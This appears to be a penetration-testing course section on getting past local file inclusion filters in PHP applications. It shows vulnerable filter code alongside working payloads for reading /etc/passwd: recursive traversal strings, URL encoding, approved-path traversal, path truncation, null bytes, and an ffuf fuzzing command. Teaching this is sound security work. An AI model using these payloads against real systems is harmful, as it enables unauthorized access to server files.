# Basic Bypasses

In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.

## Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search-and-replace filter, where it simply deletes substrings of `../` to avoid path traversals. For example:

```php
$language = str_replace('../', '', $_GET['language']);
```

The above code is supposed to prevent path traversal and renders common LFI payloads ineffective. If we try the previous payloads:

```text
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

We see that all `../` substrings were removed, resulting in a final path like `./languages/etc/passwd`.

However, this filter is insecure because it is not recursive. It runs once on the input and does not re-apply to the output. For example, if we use `....//`, the filter removes `../` and leaves `../` again.

Try:

```text
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

This can successfully include `/etc/passwd`.

Other possible recursive bypass forms include:

- `..././`
- `....\/`
- `....////`

## Encoding

Some filters block LFI-related characters like `.` or `/`. In some cases, URL encoding can bypass these filters, because blocked characters are encoded before filtering and decoded later by the vulnerable function.

If the target blocks `.` and `/`, encode `../` as `%2e%2e%2f`.

> **Note:** You must encode all characters, including dots. Some encoders do not encode `.` by default.

Example payload:

```text
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

This may bypass filtering and include `/etc/passwd`.

Double-encoding the payload may also bypass additional filter layers.

You may refer to the Command Injections module for more blacklisted-character bypass techniques, as many apply to LFI as well.

## Approved Paths

Some applications use regular expressions to force includes to a specific base path. Example:

```php
if (preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
} else {
        echo 'Illegal path specified!';
}
```

To find approved paths, inspect normal requests and fuzz directories under the same base path.

Bypass idea: start with the approved path, then traverse back:

```text
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

If combined with other filters, you can chain techniques (approved path + encoding or recursive traversal payloads).

> **Note:** The techniques above are generally language/framework agnostic for LFI.

## Appended Extension

Some applications append an extension (e.g., `.php`) to user input to restrict include targets.

With modern PHP versions, this is usually harder to bypass directly, often limiting inclusion to files with that extension. Still, older PHP versions had known bypasses.

## Path Truncation (Legacy PHP)

Older PHP versions had a max path/string length around 4096 characters (common on 32-bit systems). Longer strings were truncated.

PHP also historically normalized paths by ignoring certain trailing or repeated segments:

- trailing `/.`
- repeated slashes like `////etc/passwd`
- mid-path current directory references like `/etc/./passwd`

By combining traversal with very long filler content, the appended `.php` could be pushed past the truncation boundary and removed.

Example payload shape:

```url
?language=non_existing_directory/../../../etc/passwd/./././././[REPEATED ~2048 times]
```

Payload generation example:

```shellsession
Debl3x@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

You may also increase `../` count (extra traversal still resolves to root), but you must keep total length precise so only appended `.php` is truncated, not `/etc/passwd`.

## Null Bytes (Legacy PHP)

PHP versions before 5.5 were vulnerable to null byte injection. Appending `%00` could terminate the string early.

Example:

- Input: `/etc/passwd%00`
- Final include string (before termination): `/etc/passwd%00.php`

Everything after `%00` is ignored in vulnerable versions, so the effective path becomes `/etc/passwd`, bypassing the appended extension.

Command important to note:

`ffuf -X GET -w file_inclusion_linux.txt -u http://<SERVER_IP>:<PORT>/index.php?language=languages/FUZZ -fs 2306`

Source :

- [Github Repository](https://github.com/carlospolop/Auto_Wordlists/blob/master/wordlists/file_inclusion_linux.txt)
